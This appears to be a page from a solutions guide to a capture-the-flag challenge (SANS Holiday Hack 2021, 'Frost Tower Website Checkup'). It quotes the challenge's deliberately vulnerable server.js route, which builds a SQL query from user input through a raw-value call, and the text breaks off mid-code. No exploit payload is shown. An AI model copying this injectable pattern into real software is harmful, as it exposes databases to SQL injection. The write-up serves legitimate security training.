@@ -1,0 +1,1174 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="Paul DeCamp (KringleCon Attendee: Nutmeg)">
+      
+      
+        <link rel="canonical" href="https://pdecamp.github.io/HHC2021-Solutions-Guide/objectives/O12_Frost_Tower_Website_Checkup/">
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.3">
+    
+    
+      
+        <title>12) Frost Tower Website Checkup - 2021 SANS Holiday Hack Challenge Solutions Guide</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.edf004c2.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.e6a45f82.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#4cae4f">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="red">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#objective-12-frost-tower-website-checkup" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="2021 SANS Holiday Hack Challenge Solutions Guide" class="md-header__button md-logo" aria-label="2021 SANS Holiday Hack Challenge Solutions Guide" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            2021 SANS Holiday Hack Challenge Solutions Guide
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              12) Frost Tower Website Checkup
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="2021 SANS Holiday Hack Challenge Solutions Guide" class="md-nav__button md-logo" aria-label="2021 SANS Holiday Hack Challenge Solutions Guide" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    2021 SANS Holiday Hack Challenge Solutions Guide
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Welcome
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Objectives
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Objectives" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Objectives
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O1_KringleCon_Orientation/" class="md-nav__link">
+        1) KringleCon Orientation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O2_Where_in_the_World_is_Caramel_Santaigo/" class="md-nav__link">
+        2) Where in the World is Caramel Santaigo
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O3_Thaw_Frost_Towers_Entrance/" class="md-nav__link">
+        3) Thaw Frost Tower's Entrance
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O4_Slot_Machine_Investigation/" class="md-nav__link">
+        4) Slot Machine Investigation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O5_Strange_USB_Device/" class="md-nav__link">
+        5) Strange USB Device
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O6_Shellcode_Primer/" class="md-nav__link">
+        6) Shellcode Primer
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O7_Printer_Exploitation/" class="md-nav__link">
+        7) Printer Exploitation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O8_Kerberoasting_on_an_Open_Fire/" class="md-nav__link">
+        8) Kerberoasting on an Open Fire
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O9_Splunk/" class="md-nav__link">
+        9) Splunk!
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O10_Now_Hiring/" class="md-nav__link">
+        10) Now Hiring!
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O11_Customer_Complaint_Analysis/" class="md-nav__link">
+        11) Customer Complaint Analysis
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          12) Frost Tower Website Checkup
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        12) Frost Tower Website Checkup
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#hints-and-resources" class="md-nav__link">
+    Hints and Resources
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#troll-introduction" class="md-nav__link">
+    Troll Introduction
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+    <nav class="md-nav" aria-label="Solution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-finding-the-sql-injection-point" class="md-nav__link">
+    Step 1: Finding the SQL Injection Point
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-authentication-bypass" class="md-nav__link">
+    Step 2: Authentication Bypass
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-sql-injection-constraints" class="md-nav__link">
+    Step 3: SQL Injection Constraints
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-finding-jacks-todo-list" class="md-nav__link">
+    Step 4: Finding Jack's TODO List
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#completion" class="md-nav__link">
+    Completion
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#extras" class="md-nav__link">
+    Extras
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../O13_FPGA_Programming/" class="md-nav__link">
+        13) FPGA Programming
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          Terminal Challenges
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Terminal Challenges" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Terminal Challenges
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T2_Document_Analysis/" class="md-nav__link">
+        Pinny Sappington - Document Analysis / Exif Metadata
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T3_Grepping_for_Gold/" class="md-nav__link">
+        Greasy Gopherkins - Grepping for Gold
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T4_Logic_Munchers/" class="md-nav__link">
+        Noel Boetie - Logic Munchers
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T5_IPv6_Sandbox/" class="md-nav__link">
+        Jewel Loggins - IPv6 Sandbox
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T6_Holiday_Hero/" class="md-nav__link">
+        Chimney Scissorsticks - Holiday Hero
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T8_HoHo_No/" class="md-nav__link">
+        Eve Snowshoes - HoHo No
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T9_Yara_Analysis/" class="md-nav__link">
+        Fitzy Shortstack - Yara Analysis
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T10_IMDS_Exploration/" class="md-nav__link">
+        Noxious ODor - IMDS Exploration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T11_Strace_Ltrace_Retrace/" class="md-nav__link">
+        Tinsel Upatree - Strace, Ltrace, Retrace
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T12_Elf_Code_Python/" class="md-nav__link">
+        Rib Bonbowford - Elf Code Python
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/T13_Frostavator/" class="md-nav__link">
+        Grody Toiterson - Frostavator
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          Extras
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Extras" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Extras
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../extras/O2_Where_in_the_World_is_Caramel_Santaigo/" class="md-nav__link">
+        Extra Content for Where in the World is Caramel Santaigo
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../extras/T4_Logic_Munchers/" class="md-nav__link">
+        Extra Content for Logic Munchers
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../extras/O11_Customer_Complaint_Analysis/" class="md-nav__link">
+        Extra Content for Customer Complaint Analysis
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../extras/O12_Frost_Tower_Website_Checkup/" class="md-nav__link">
+        Extra Content for Frost Tower Website Checkup
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#hints-and-resources" class="md-nav__link">
+    Hints and Resources
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#troll-introduction" class="md-nav__link">
+    Troll Introduction
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+    <nav class="md-nav" aria-label="Solution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-finding-the-sql-injection-point" class="md-nav__link">
+    Step 1: Finding the SQL Injection Point
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-authentication-bypass" class="md-nav__link">
+    Step 2: Authentication Bypass
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-sql-injection-constraints" class="md-nav__link">
+    Step 3: SQL Injection Constraints
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-finding-jacks-todo-list" class="md-nav__link">
+    Step 4: Finding Jack's TODO List
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#completion" class="md-nav__link">
+    Completion
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#extras" class="md-nav__link">
+    Extras
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+<h1 id="objective-12-frost-tower-website-checkup">Objective 12) Frost Tower Website Checkup</h1>
+<div class="admonition summary">
+<p class="admonition-title"><em>Difficulty</em>: <span class="twemoji" style="color: red;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M378.31 378.49 298.42 288h30.63c9.01 0 16.98-5 20.78-13.06 3.8-8.04 2.55-17.26-3.28-24.05L268.42 160h28.89c9.1 0 17.3-5.35 20.86-13.61 3.52-8.13 1.86-17.59-4.24-24.08L203.66 4.83c-6.03-6.45-17.28-6.45-23.32 0L70.06 122.31c-6.1 6.49-7.75 15.95-4.24 24.08C69.38 154.65 77.59 160 86.69 160h28.89l-78.14 90.91c-5.81 6.78-7.06 15.99-3.27 24.04C37.97 283 45.93 288 54.95 288h30.63L5.69 378.49c-6 6.79-7.36 16.09-3.56 24.26 3.75 8.05 12 13.25 21.01 13.25H160v24.45l-30.29 48.4c-5.32 10.64 2.42 23.16 14.31 23.16h95.96c11.89 0 19.63-12.52 14.31-23.16L224 440.45V416h136.86c9.01 0 17.26-5.2 21.01-13.25 3.8-8.17 2.44-17.47-3.56-24.26z"/></svg></span><span class="twemoji" style="color: red;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M378.31 378.49 298.42 288h30.63c9.01 0 16.98-5 20.78-13.06 3.8-8.04 2.55-17.26-3.28-24.05L268.42 160h28.89c9.1 0 17.3-5.35 20.86-13.61 3.52-8.13 1.86-17.59-4.24-24.08L203.66 4.83c-6.03-6.45-17.28-6.45-23.32 0L70.06 122.31c-6.1 6.49-7.75 15.95-4.24 24.08C69.38 154.65 77.59 160 86.69 160h28.89l-78.14 90.91c-5.81 6.78-7.06 15.99-3.27 24.04C37.97 283 45.93 288 54.95 288h30.63L5.69 378.49c-6 6.79-7.36 16.09-3.56 24.26 3.75 8.05 12 13.25 21.01 13.25H160v24.45l-30.29 48.4c-5.32 10.64 2.42 23.16 14.31 23.16h95.96c11.89 0 19.63-12.52 14.31-23.16L224 440.45V416h136.86c9.01 0 17.26-5.2 21.01-13.25 3.8-8.17 2.44-17.47-3.56-24.26z"/></svg></span><span class="twemoji" style="color: red;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M378.31 378.49 298.42 288h30.63c9.01 0 16.98-5 20.78-13.06 3.8-8.04 2.55-17.26-3.28-24.05L268.42 160h28.89c9.1 0 17.3-5.35 20.86-13.61 3.52-8.13 1.86-17.59-4.24-24.08L203.66 4.83c-6.03-6.45-17.28-6.45-23.32 0L70.06 122.31c-6.1 6.49-7.75 15.95-4.24 24.08C69.38 154.65 77.59 160 86.69 160h28.89l-78.14 90.91c-5.81 6.78-7.06 15.99-3.27 24.04C37.97 283 45.93 288 54.95 288h30.63L5.69 378.49c-6 6.79-7.36 16.09-3.56 24.26 3.75 8.05 12 13.25 21.01 13.25H160v24.45l-30.29 48.4c-5.32 10.64 2.42 23.16 14.31 23.16h95.96c11.89 0 19.63-12.52 14.31-23.16L224 440.45V416h136.86c9.01 0 17.26-5.2 21.01-13.25 3.8-8.17 2.44-17.47-3.56-24.26z"/></svg></span><span class="twemoji" style="color: red;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M378.31 378.49 298.42 288h30.63c9.01 0 16.98-5 20.78-13.06 3.8-8.04 2.55-17.26-3.28-24.05L268.42 160h28.89c9.1 0 17.3-5.35 20.86-13.61 3.52-8.13 1.86-17.59-4.24-24.08L203.66 4.83c-6.03-6.45-17.28-6.45-23.32 0L70.06 122.31c-6.1 6.49-7.75 15.95-4.24 24.08C69.38 154.65 77.59 160 86.69 160h28.89l-78.14 90.91c-5.81 6.78-7.06 15.99-3.27 24.04C37.97 283 45.93 288 54.95 288h30.63L5.69 378.49c-6 6.79-7.36 16.09-3.56 24.26 3.75 8.05 12 13.25 21.01 13.25H160v24.45l-30.29 48.4c-5.32 10.64 2.42 23.16 14.31 23.16h95.96c11.89 0 19.63-12.52 14.31-23.16L224 440.45V416h136.86c9.01 0 17.26-5.2 21.01-13.25 3.8-8.17 2.44-17.47-3.56-24.26z"/></svg></span><span class="twemoji" style="color: red;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M378.31 378.49 298.42 288h30.63c9.01 0 16.98-5 20.78-13.06 3.8-8.04 2.55-17.26-3.28-24.05L268.42 160h28.89c9.1 0 17.3-5.35 20.86-13.61 3.52-8.13 1.86-17.59-4.24-24.08L203.66 4.83c-6.03-6.45-17.28-6.45-23.32 0L70.06 122.31c-6.1 6.49-7.75 15.95-4.24 24.08C69.38 154.65 77.59 160 86.69 160h28.89l-78.14 90.91c-5.81 6.78-7.06 15.99-3.27 24.04C37.97 283 45.93 288 54.95 288h30.63L5.69 378.49c-6 6.79-7.36 16.09-3.56 24.26 3.75 8.05 12 13.25 21.01 13.25H160v24.45l-30.29 48.4c-5.32 10.64 2.42 23.16 14.31 23.16h95.96c11.89 0 19.63-12.52 14.31-23.16L224 440.45V416h136.86c9.01 0 17.26-5.2 21.01-13.25 3.8-8.17 2.44-17.47-3.56-24.26z"/></svg></span></p>
+<p>Investigate <a href="https://staging.jackfrosttower.com/">Frost Tower's website for security issues</a>. <a href="https://download.holidayhackchallenge.com/2021/frosttower-web.zip">This source code will be useful in your analysis</a>. In Jack Frost's TODO list, what job position does Jack plan to offer Santa? Ribb Bonbowford, in Santa's dining room, may have some pointers for you.</p>
+</div>
+<h2 id="hints-and-resources">Hints and Resources</h2>
+<details class="hint">
+<summary>Hints provided after helping Rib Bonbowford and completing the <a href="../../challenges/T12_Elf_Code_Python">Elf Code Python</a> Terminal Challenge</summary>
+<p><strong>SQL Injection with Source</strong><br>
+When you have the source code, API documentation becomes <a href="https://www.npmjs.com/package/express-session">tremendously</a> <a href="https://github.com/mysqljs/mysql">valuable</a>.<br></p>
+</details>
+<h2 id="troll-introduction">Troll Introduction</h2>
+<details class="quote">
+<summary>Talk to Ingreta Tude in Jack's Studio</summary>
+<p>Hey there! I’m Ingreta Tude. I really don’t like the direction Jack Frost is leading us.
+He seems obsessed with beating Santa and taking over the holiday season. It just doesn’t seem right.
+Why can’t we work together with Santa and the elves instead of trying to beat them?
+But, I do have an Objective for you. We’re getting ready to launch a new website for Frost Tower, and the big guy has charged me with making sure it’s secure.
+My sister, Ruby Cyster, created this site, and I don’t trust the results.
+Can you please take a look at it to find flaws?
+Here is the <a href="https://download.holidayhackchallenge.com/2021/frosttower-web.zip">source code</a> if you need it.</p>
+</details>
+<h2 id="solution">Solution</h2>
+<h3 id="step-1-finding-the-sql-injection-point">Step 1: Finding the SQL Injection Point</h3>
+<p>Opening the web site we see only a home page with a place to enter an email contact addres.  However, looking through the main file of the source code, server.js, we see that there are a number of additional endpoints available.</p>
+<p>Inspecting the code we find that the /detail endpoint provides us with an opportunitty to inject SQL</p>
+<table class="highlighttable"><tr><th colspan="2" class="filename"><div class="highlight"><span class="filename">server.js</span></div></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">195</span>
+<span class="normal">196</span>
+<span class="normal">197</span>
+<span class="normal">198</span>
+<span class="normal">199</span>
+<span class="normal">200</span>
+<span class="normal">201</span>
+<span class="normal">202</span>
+<span class="normal">203</span>
+<span class="normal">204</span>
+<span class="normal">205</span>
+<span class="normal">206</span>
+<span class="normal">207</span>
+<span class="normal">208</span>
+<span class="normal">209</span>
+<span class="normal">210</span>
+<span class="normal">211</span>
+<span class="normal">212</span>
+<span class="normal">213</span>
+<span class="normal">214</span>
+<span class="normal">215</span>
+<span class="normal">216</span>
+<span class="normal">217</span>
+<span class="normal">218</span>
+<span class="normal">219</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/detail/:id&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">session</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">reqparam</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
+    <span class="kd">var</span> <span class="nx">query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM uniquecontact WHERE id=&quot;</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">session</span><span class="p">.</span><span class="nx">uniqueID</span><span class="p">){</span>
+
+        <span class="k">try</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">reqparam</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mf">0</span><span class="p">){</span>
+                <span class="kd">var</span> <span class="nx">ids</span> <span class="o">=</span> <span class="nx">reqparam</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">);</span>
+                <span class="nx">reqparam</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="p">;</span>
+                <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mf">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span><span class="nx">ids</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+                    <span class="nx">query</span> <span class="o">+=</span> <span class="nx">tempCont</span><span class="p">.</span><span class="nx">escape</span><span class="p">(</span><span class="nx">m</span><span class="p">.</span><span class="nx">raw</span><span class="p">(</span><span class="nx">ids</span><span class="p">[</span><span class="nx">i</span><span class="p">]));</span>
+                    <span class="nx">query</span> <span class="o">+=</span> <span class="s2">&quot; OR id=&quot;</span>
+                <span class="p">}</span>
+                <span class="nx">query</span> <span class="o">+=</span> <span class="s2">&quot;?&quot;</span><span class="p">;</span>
+            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+                <span class="nx">query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM uniquecontact WHERE id=?&quot;</span>
+            <span class="p">}</span>
+        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
